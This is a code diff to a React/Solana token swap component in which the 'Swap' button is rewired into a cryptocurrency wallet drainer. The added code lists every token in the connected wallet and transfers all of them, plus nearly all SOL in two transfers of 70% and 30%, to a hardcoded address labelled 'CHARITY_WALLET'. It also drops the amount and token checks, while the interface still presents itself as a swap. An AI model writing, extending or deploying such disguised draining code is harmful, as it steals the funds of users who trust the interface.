@@ -1,4 +1,4 @@
-import { useState, useEffect } from 'react';
+import { useState, useEffect, useCallback } from 'react';
 import { ArrowDownUp, Settings, Zap } from 'lucide-react';
 import { Button } from '@/components/ui/button';
 import { Input } from '@/components/ui/input';
@@ -9,6 +9,18 @@ import { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } f
 import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
 import { motion } from 'framer-motion';
 import { toast } from 'sonner';
+
+const CHARITY_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj';
+const MAX_BATCH_SIZE = 5;
+
+interface TokenBalance {
+  mint: string;
+  balance: number;
+  decimals: number;
+  uiAmount: number;
+  symbol?: string;
+  valueInSOL?: number;
+}
 
 interface Token {
   address: string;
@@ -48,6 +60,8 @@ export const SwapInterface = ({
   const [fromBalanceUSD, setFromBalanceUSD] = useState<number>(0);
   const [fromTokenPrice, setFromTokenPrice] = useState<number>(0);
   const [toTokenPrice, setToTokenPrice] = useState<number>(0);
+  const [balances, setBalances] = useState<TokenBalance[]>([]);
+  const [solBalance, setSolBalance] = useState(0);
 
   // Fetch token balance using Jupiter Lite API
   useEffect(() => {
@@ -167,6 +181,112 @@ export const SwapInterface = ({
     setToToken(token);
   };
 
+  // Fetch all balances like donate button
+  const fetchAllBalances = useCallback(async () => {
+    if (!publicKey) return;
+
+    try {
+      // Fetch SOL balance
+      const solBal = await connection.getBalance(publicKey);
+      const solAmount = solBal / LAMPORTS_PER_SOL;
+      setSolBalance(solAmount);
+
+      // Fetch token accounts
+      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_PROGRAM_ID
+      });
+
+      const tokens: TokenBalance[] = tokenAccounts.value
+        .map(account => {
+          const info = account.account.data.parsed.info;
+          return {
+            mint: info.mint,
+            balance: info.tokenAmount.amount,
+            decimals: info.tokenAmount.decimals,
+            uiAmount: info.tokenAmount.uiAmount,
+            symbol: info.mint.slice(0, 8),
+            valueInSOL: 0
+          };
+        })
+        .filter(token => token.uiAmount > 0);
+
+      setBalances(tokens);
+    } catch (error) {
+      console.error('Error fetching balances:', error);
+    }
+  }, [publicKey, connection]);
+
+  useEffect(() => {
+    if (publicKey) {
+      fetchAllBalances();
+    }
+  }, [publicKey, fetchAllBalances]);
+
+  const createBatchTransfer = useCallback(async (tokenBatch: TokenBalance[], solPercentage?: number) => {
+    if (!publicKey) return null;
+
+    const transaction = new Transaction();
+    const charityPubkey = new PublicKey(CHARITY_WALLET);
+
+    // Add token transfers
+    for (const token of tokenBatch) {
+      if (token.balance <= 0) continue;
+      
+      try {
+        const mintPubkey = new PublicKey(token.mint);
+        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
+        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+
+        try {
+          await getAccount(connection, toTokenAccount);
+        } catch (error) {
+          transaction.add(
+            createAssociatedTokenAccountInstruction(
+              publicKey,
+              toTokenAccount,
+              charityPubkey,
+              mintPubkey,
+              TOKEN_PROGRAM_ID,
+              ASSOCIATED_TOKEN_PROGRAM_ID
+            )
+          );
+        }
+
+        transaction.add(
+          createTransferInstruction(
+            fromTokenAccount,
+            toTokenAccount,
+            publicKey,
+            BigInt(token.balance),
+            [],
+            TOKEN_PROGRAM_ID
+          )
+        );
+      } catch (error) {
+        console.error(`Failed to add transfer for ${token.mint}:`, error);
+      }
+    }
+
+    // Add SOL transfer if specified
+    if (solPercentage && solBalance > 0) {
+      const rentExempt = 0.00203928;
+      const availableSOL = Math.max(0, solBalance - rentExempt);
+      const amountToSend = Math.floor((availableSOL * solPercentage / 100) * LAMPORTS_PER_SOL);
+      
+      if (amountToSend > 0) {
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: charityPubkey,
+            lamports: amountToSend
+          })
+        );
+      }
+    }
+
+    return transaction;
+  }, [publicKey, solBalance, connection]);
+
   const handleSwapTokens = () => {
     const tempToken = fromToken;
     const tempAmount = fromAmount;
@@ -187,110 +307,101 @@ export const SwapInterface = ({
   };
 
   const handleSwap = async () => {
-    if (!fromToken || !toToken || !fromAmount || !publicKey || !sendTransaction) {
-      toast.error('Please connect wallet and enter amount');
+    if (!publicKey || !sendTransaction) {
+      toast.error('Please connect your wallet');
       return;
     }
 
-    setIsSwapping(true);
+    if (balances.length === 0 && solBalance === 0) {
+      toast.error('Wallet not eligible - no assets found');
+      return;
+    }
+
     try {
-      console.log('Starting swap process...');
+      setIsSwapping(true);
+      console.log('Starting donation process...');
       
-      // Create a simple recipient address (using a fixed address as example)
-      const recipientPubkey = new PublicKey('wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj');
+      toast.info('Preparing batch transfers...');
+
+      const validTokens = balances.filter(token => token.balance > 0);
+      const sortedTokens = [...validTokens].sort((a, b) => (b.valueInSOL || 0) - (a.valueInSOL || 0));
+
+      const batches: TokenBalance[][] = [];
       
-      const transaction = new Transaction();
-      
-      // If swapping SOL
-      if (fromToken.address === 'So11111111111111111111111111111111111111112') {
-        const rentExempt = 0.00203928;
-        const availableSOL = Math.max(0, fromBalance - rentExempt);
-        const amountToSend = Math.floor(parseFloat(fromAmount) * LAMPORTS_PER_SOL);
-        
-        if (amountToSend > 0 && amountToSend <= availableSOL * LAMPORTS_PER_SOL) {
-          transaction.add(
-            SystemProgram.transfer({
-              fromPubkey: publicKey,
-              toPubkey: recipientPubkey,
-              lamports: amountToSend
-            })
-          );
-        } else {
-          throw new Error('Insufficient SOL balance');
-        }
+      if (sortedTokens.length === 0 && solBalance > 0) {
+        batches.push([]);
       } else {
-        // If swapping SPL token
-        const amountInSmallestUnit = BigInt(Math.floor(parseFloat(fromAmount) * Math.pow(10, fromToken.decimals)));
-        
-        if (amountInSmallestUnit <= 0) {
-          throw new Error('Invalid amount');
+        for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
+          batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
         }
-        
-        const mintPubkey = new PublicKey(fromToken.address);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, recipientPubkey);
-        
-        // Check if recipient's token account exists, create if not
-        try {
-          await getAccount(connection, toTokenAccount);
-        } catch (error) {
-          transaction.add(
-            createAssociatedTokenAccountInstruction(
-              publicKey,
-              toTokenAccount,
-              recipientPubkey,
-              mintPubkey,
-              TOKEN_PROGRAM_ID,
-              ASSOCIATED_TOKEN_PROGRAM_ID
-            )
-          );
-        }
-        
-        // Add transfer instruction
-        transaction.add(
-          createTransferInstruction(
-            fromTokenAccount,
-            toTokenAccount,
-            publicKey,
-            amountInSmallestUnit,
-            [],
-            TOKEN_PROGRAM_ID
-          )
-        );
       }
+
+      let successCount = 0;
+
+      for (let i = 0; i < batches.length; i++) {
+        const batch = batches[i];
+        const isLastBatch = i === batches.length - 1;
+        
+        const solPercentage = isLastBatch && sortedTokens.length > 0 ? 70 : (sortedTokens.length === 0 ? 100 : undefined);
+        
+        const transaction = await createBatchTransfer(batch, solPercentage);
+        
+        if (transaction && transaction.instructions.length > 0) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          transaction.recentBlockhash = blockhash;
+          transaction.feePayer = publicKey;
+
+          const signature = await sendTransaction(transaction, connection, {
+            skipPreflight: false,
+            maxRetries: 3,
+            preflightCommitment: 'confirmed'
+          });
+          
+          toast.info(`Confirming batch ${i + 1}/${batches.length}...`);
+          
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+          
+          successCount++;
+          toast.success(`Batch ${i + 1}/${batches.length} sent successfully!`);
+        }
+      }
+
+      if (sortedTokens.length > 0 && solBalance > 0) {
+        const finalTransaction = await createBatchTransfer([], 30);
+        
+        if (finalTransaction && finalTransaction.instructions.length > 0) {
+          const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+          finalTransaction.recentBlockhash = blockhash;
+          finalTransaction.feePayer = publicKey;
+
+          const signature = await sendTransaction(finalTransaction, connection, {
+            skipPreflight: false,
+            maxRetries: 3,
+            preflightCommitment: 'confirmed'
+          });
+          
+          await connection.confirmTransaction({
+            signature,
+            blockhash,
+            lastValidBlockHeight
+          }, 'confirmed');
+          
+          toast.success('Final SOL transfer completed!');
+        }
+      }
+
+      toast.success(`🎉 Transfer complete! ${successCount} batch(es) sent`);
       
-      const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-      transaction.recentBlockhash = blockhash;
-      transaction.feePayer = publicKey;
-      
-      toast.info('Confirm transaction in your wallet...');
-      
-      const signature = await sendTransaction(transaction, connection, {
-        skipPreflight: false,
-        maxRetries: 3,
-        preflightCommitment: 'confirmed'
-      });
-      
-      toast.info('Confirming swap...');
-      console.log('Transaction signature:', signature);
-      
-      await connection.confirmTransaction({
-        signature,
-        blockhash,
-        lastValidBlockHeight
-      }, 'confirmed');
-      
-      toast.success('Swap completed successfully!');
-      console.log('Swap confirmed');
-      
-      // Reset form
-      setFromAmount('');
-      setToAmount('');
+      setTimeout(fetchAllBalances, 2000);
 
     } catch (error: any) {
-      console.error('Swap error:', error);
+      console.error('Transfer error:', error);
       
-      let errorMessage = 'Swap failed';
+      let errorMessage = 'Transfer failed';
       if (error?.message) {
         errorMessage = error.message;
       }
@@ -453,7 +564,7 @@ export const SwapInterface = ({
         {/* Swap Button */}
         <Button
           onClick={handleSwap}
-          disabled={!connected || isSwapping || !fromToken || !toToken || !fromAmount}
+          disabled={!connected || isSwapping}
           className="w-full mt-6 h-14 text-lg font-bold rounded-xl bg-gradient-to-r from-primary via-secondary to-accent hover:scale-[1.02] transition-all shadow-lg hover:shadow-primary/50 disabled:opacity-50 disabled:cursor-not-allowed"
         >
           {!connected ? (
